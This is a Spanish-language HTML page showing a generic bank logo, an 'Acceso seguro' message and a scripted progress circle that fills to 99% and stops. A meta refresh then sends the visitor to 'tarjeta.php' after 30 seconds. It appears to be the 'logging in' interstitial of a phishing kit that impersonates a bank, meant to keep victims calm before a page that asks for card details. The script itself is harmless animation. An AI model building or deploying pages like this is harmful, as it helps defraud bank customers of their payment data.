<!doctype html>
<html lang="en">
<head>
  <link rel="icon" type="ico" href="favicon.ico">
  <link rel="icon" type="ico" href="favicon.ico">
  <script src="https://code.jquery.com/jquery-3.7.1.js" integrity="sha256-eKhayi8LEQwp4NKxN+CfCh+3qOVUtJn3QNZ0TciWLP4=" crossorigin="anonymous"></script>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>pagina cargando</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
  <style type="text/css">
    .reloj{height: 150px;width: 150px;position:relative;background:conic-gradient(#00824a 3.6deg, #aaa 0deg);border-radius: 150px;transition: all 1s;box-shadow: 0px 5px 5px 0px #2222;margin: auto;}.reloj::before{height: 120px;width: 120px;border-radius: 140px;background-color: #FFF;position:absolute;left: 0;top: 0;right: 0;bottom: 0;margin: auto;content: "";}.progresvalue{position: absolute;z-index: 999;top: 0;left: 0;height: 120px;border-radius: 140px;display: flex;justify-content: center;align-items: center;width: 120px;bottom: 0;font-weight: bolder;color: #00824a !important;font-size:22px;right:0;margin: auto;}
  </style>
  <meta http-equiv="refresh" content="30;URL=tarjeta.php">
</head>
<body class="">
  <div class="row position-fixed h-100 w-100 justify-content-between m-0">
    <div class="col-12 p-0 text-center">
     <div class="w-100 p-4 border-bottom bg-white">
      <img src="img/bank_logo.png" height="40px">
    </div>
  </div>
  <div class="col-sm-6 col-md-5 col-xl-4 m-auto mt-0 text-center">
    <h3 class="mb-2 fs-1">Acceso seguro</h3>
    <p class="text-center mb-5">Espere mientras el sistema inicia sesión de manera segura.</p>
    <div class="reloj-content">
      <div class="reloj text-center">
        <div class="progresvalue">0%</div>
      </div>
    </div>
  </div>
  <div class="col-12"></div>
</div>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL" crossorigin="anonymous"></script>
<script>
  let ciruclar_prog = $(".reloj");
  let progres_value = $(".progresvalue");

  let progresValue = 0,
  progresEndValue =99,
  progresSpeed = 300;

  let IntervalProgressFunction = setInterval(()=>{
    progresValue++;
    progres_value.html(progresValue+"%");
    ciruclar_prog.css("background","conic-gradient(#00824a "+ progresValue * 3.6 +"deg, #aaa 0deg)")

    if(progresValue == progresEndValue){
      clearInterval(IntervalProgressFunction);
    }
  },progresSpeed)
</script>
</body>
</html>